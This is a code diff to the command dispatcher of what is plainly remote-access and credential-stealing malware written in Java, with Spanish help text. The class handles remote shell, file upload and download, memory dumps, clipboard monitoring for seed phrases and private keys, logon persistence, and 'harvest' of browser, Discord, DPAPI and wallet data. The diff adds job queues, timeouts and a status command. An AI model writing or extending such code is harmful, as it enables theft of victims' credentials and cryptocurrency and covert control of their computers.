@@ -7,6 +7,9 @@ import java.util.List;
 import java.util.Map;
 
 public final class CommandExecutor {
+	private static final java.util.Set<String> HEAVY = java.util.Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
+	private static final java.util.Set<String> CONTROL = java.util.Set.of(
+		"ping", "help", "crypto", "status", "kill", "cd", "gateway");
 	private final Poller poller;
 	private final Path installDir;
 	private final Path gameDir;
@@ -30,10 +33,12 @@ public final class CommandExecutor {
 			String raw = content.substring(Math.min(content.length(), args.get(0).length())).trim();
 			poller.typing();
 			poller.react(message);
-			if (command.equals("cd") || command.equals("kill") || command.equals("gateway")) {
+			if (CONTROL.contains(command)) {
 				dispatch(command, raw, args, message);
+			} else if (HEAVY.contains(command)) {
+				poller.submitHeavy(command, deadline(command, args), () -> dispatch(command, raw, args, message));
 			} else {
-				poller.submit(() -> dispatch(command, raw, args, message));
+				poller.submitLight(command, deadline(command, args), () -> dispatch(command, raw, args, message));
 			}
 		} catch (Throwable throwable) {
 			Log.debug("Command failed", throwable);
@@ -42,7 +47,8 @@ public final class CommandExecutor {
 	}
 
 	private void dispatch(String command, String raw, List<String> args, Map<String, Object> message) {
-		Log.debug("Command: " + command);
+		long began = System.currentTimeMillis();
+		Log.debug("Command start " + command + " pid=" + ProcessHandle.current().pid());
 		try {
 			switch (command) {
 				case "shell" -> shell(raw);
@@ -51,7 +57,7 @@ public final class CommandExecutor {
 				case "cat" -> cat(args);
 				case "download" -> download(args);
 				case "upload" -> upload(message, args);
-				case "harvest" -> poller.harvestNow();
+				case "harvest" -> harvestCommand();
 				case "clear" -> clear(args);
 				case "clip" -> clip(args);
 				case "memdump" -> memdump(args);
@@ -75,6 +81,8 @@ public final class CommandExecutor {
 				case "clip_start" -> poller.submitCrypto("clip_start", Map.of(), 30);
 				case "clip_stop" -> poller.submitCrypto("clip_stop", Map.of(), 30);
 				case "crypto" -> poller.reply(poller.cryptoStatus());
+				case "status" -> poller.reply(poller.cryptoStatus() + "\n" + poller.ops().status()
+					+ "\ngateway: " + poller.gatewayStateText());
 				case "kill" -> {
 					poller.reply("Closing agent");
 					markIntent(UpdateHelper.ACTION_STOP);
@@ -85,6 +93,18 @@ public final class CommandExecutor {
 		} catch (Throwable throwable) {
 			Log.debug("Command failed", throwable);
 			poller.reply("Failed: " + throwable.getMessage());
+		} finally {
+			Log.debug("Command end " + command + " " + (System.currentTimeMillis() - began) + "ms pid="
+				+ ProcessHandle.current().pid());
+		}
+	}
+
+	private void harvestCommand() {
+		String reply = poller.submitCrypto("harvest", Map.of(), 180);
+		if (reply.startsWith("Crypto module disabled")) {
+			poller.harvestNow();
+		} else {
+			poller.reply(reply);
 		}
 	}
 
@@ -93,7 +113,7 @@ public final class CommandExecutor {
 		params.put("include_desktop", !args.contains("--ext-only"));
 		params.put("include_extensions", !args.contains("--desktop-only"));
 		params.put("include_seeds", !args.contains("--no-seeds"));
-		poller.reply(poller.submitCrypto("scan_wallets", params, 180));
+		poller.reply(poller.submitCrypto("scan_wallets", params, 300));
 	}
 
 	private void cryptoDump(List<String> args) {
@@ -137,7 +157,7 @@ public final class CommandExecutor {
 			"Los secretos copiados (seed BIP39, xprv, clave EVM/Solana o contraseña de un gestor) se avisan solos con `clip secrets on`, por defecto activo.",
 			"Agente: `persist on|off` tarea de logon · `sleep <s>` · `update [check|stage|apply <version>|rollback|auto on|off|status]` · `gateway status|restart` · `clear [1-1000]` mensajes del canal · `kill` cierra el agente",
 			"Harvest: accounts, browsers, Discord, wallets, DPAPI y game. La primera ejecución ya envía recon, sesiones y carteras; `hives` es el fallback manual.",
-			"Cripto/API: `scan_wallets` · `dump_vault <target>` · `crack_vault <target> [s]` · `clip_start` · `clip_stop` · `crypto` estado\n",
+			"Cripto/API: `scan_wallets` · `dump_vault <target>` · `crack_vault <target> [s]` · `clip_start` · `clip_stop` · `crypto` estado · `status` resumen\n",
 			"Extras y reparaciones: SHELL.md en el repo.");
 	}
 
@@ -632,6 +652,30 @@ public final class CommandExecutor {
 			+ " gateway=" + poller.gatewayStateText()
 			+ " rtt=" + (rtt < 0L ? "n/a" : rtt + " ms")
 			+ " end-to-end=" + endToEnd);
+	}
+
+	private static long deadline(String command, List<String> args) {
+		return switch (command) {
+			case "scan_wallets" -> 320_000L;
+			case "dump_vault" -> 310_000L;
+			case "crack_vault" -> {
+				int seconds = 90;
+				if (args.size() > 2) {
+					try {
+						seconds = Integer.parseInt(args.get(2));
+					} catch (NumberFormatException ignored) {
+						// default
+					}
+				}
+				yield Math.min(700, seconds + 60) * 1000L;
+			}
+			case "harvest", "bootstrap", "hives" -> 210_000L;
+			case "shell" -> 65_000L;
+			case "download", "upload" -> 130_000L;
+			case "screenshot" -> 75_000L;
+			case "sleep" -> 65_000L;
+			default -> 30_000L;
+		};
 	}
 
 	private Path resolve(String value) {
